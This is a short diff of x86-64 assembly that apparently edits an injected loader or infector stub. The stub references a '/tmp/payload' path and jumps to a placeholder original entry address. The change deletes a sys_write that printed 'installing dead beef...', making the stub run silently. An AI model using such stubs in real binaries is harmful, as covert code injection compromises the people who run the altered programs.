@@ -95,18 +95,8 @@ _start:
     syscall
 
 original:
-    mov rax, 1 ; sys_write
-    mov rdi, 1
-    lea rsi, [rel text]
-    mov rdx, text_end - text
-    syscall
-
     mov rax, 0xDEADBEEFDEADBEEF
     jmp rax
-
-text:
-    db "installing dead beef...", 0x0A
-text_end:
 
 path:
     db "/tmp/payload", 0
